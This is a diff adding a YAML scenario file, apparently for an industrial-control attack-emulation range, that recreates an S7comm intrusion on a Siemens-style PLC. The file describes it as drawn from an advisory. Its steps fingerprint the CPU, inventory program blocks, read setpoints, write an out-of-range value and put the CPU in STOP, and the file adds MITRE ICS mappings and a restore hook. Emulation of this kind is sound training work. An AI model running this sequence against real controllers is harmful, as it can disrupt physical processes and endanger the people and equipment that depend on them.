@@ -1,0 +1,120 @@
+id: s7_aa26_231a
+name: AA26-231A S7comm PLC intrusion (OT stage)
+family: AA26-231A S7 Series targeting (2026)
+year: '2026'
+protocol: S7comm
+target: S7 PLC ({mfg}:102)
+desc: The OT stage of Joint Advisory AA26-231A written as declarative S7comm steps. A python-snap7 style
+  script fingerprints the CPU, inventories program blocks, reads the running setpoints from DB3, overwrites
+  one setpoint with an out-of-range value, then places the CPU in STOP, halting the controlled process.
+color: '#e53935'
+briefing:
+- SOURCE: Joint Cybersecurity Advisory AA26-231A (NSA/CISA/FBI/DOE/EPA, 19 Aug 2026)
+- 'Report, "Tooling and OT stage": custom Python script using snap7.dll / python-snap7, mimicking legitimate
+  monitoring utilities, with read and write access to PLC memory, configuration data and ladder logic
+  over S7comm on TCP port 102. Observed sequence on a compromised controller (rack 0, slot 1).'
+- ''
+- 'Step 1 [report item 1]: Identity and CPU state read first, so the session resembles a normal monitoring
+  poll rather than an intrusion -> cpu_info'
+- 'Step 2 [report item 2]: System state list read to fingerprint the CPU model and firmware -> read_szl
+  SZL 0x001C (component identification)'
+- 'Step 3 [report item 3]: Program blocks enumerated to inventory the ladder logic present on the controller
+  -> list_blocks (DB then OB)'
+- 'Step 4 [report item 4]: Process memory read from data block 3 (the running setpoints) -> read_db DB3,
+  12 bytes as real'
+- 'Step 5 [report item 5]: A setpoint in data block 3 overwritten with an out-of-range value -> write_db
+  DB3 offset 0 = 9999.0'
+- 'Step 6 [report item 6]: The CPU placed in STOP, halting the controlled process -> cpu_control STOP'
+- ''
+- 'Report, "Detection": hunt for anomalous S7comm behaviour on TCP port 102 and temporal anomalies such
+  as off-hours S7comm activity.'
+- ''
+- 'VISIBLE IMPACT: process setpoint driven out of range, then the controller halts and the controlled
+  process stops.'
+- ''
+- ICS MITRE ATT&CK
+- T0846  Remote System Discovery (cpu_info / SZL fingerprint)
+- T0888  Theft of Operational Information (block inventory, DB3 read)
+- T0836  Modify Parameter (out-of-range setpoint write)
+- T0814  Denial of Service (CPU STOP)
+watch:
+  plc: mfg
+  proto: s7
+  kind: generic
+  # Restore issues DB3 normal setpoints, clears the rootkit flag, then cold-starts the
+  # CPU - without it the final cpu_control STOP leaves the controller unrecoverable
+  # from the dashboard.
+  restore: centrifuge
+steps:
+- protocol: s7
+  module: cpu_info
+  plc: mfg
+  port: 102
+  options:
+    rack: 0
+    slot: 1
+  duration: 5
+- protocol: s7
+  module: read_szl
+  plc: mfg
+  port: 102
+  options:
+    rack: 0
+    slot: 1
+    szl_id: '0x001C'
+    index: '0x0000'
+  duration: 5
+- protocol: s7
+  module: list_blocks
+  plc: mfg
+  port: 102
+  options:
+    rack: 0
+    slot: 1
+    block_type: DB
+  duration: 5
+- protocol: s7
+  module: list_blocks
+  plc: mfg
+  port: 102
+  options:
+    rack: 0
+    slot: 1
+    block_type: OB
+  duration: 5
+- protocol: s7
+  module: read_db
+  plc: mfg
+  port: 102
+  options:
+    rack: 0
+    slot: 1
+    area: DB
+    db: 3
+    start: 0
+    size: 12
+    dtype: real
+  duration: 5
+- protocol: s7
+  module: write_db
+  plc: mfg
+  port: 102
+  options:
+    rack: 0
+    slot: 1
+    area: DB
+    db: 3
+    start: 0
+    dtype: real
+    value: '9999.0'
+  duration: 5
+- protocol: s7
+  module: cpu_control
+  plc: mfg
+  port: 102
+  options:
+    rack: 0
+    slot: 1
+    cpu_mode: STOP
+  duration: 10
+source: copilot
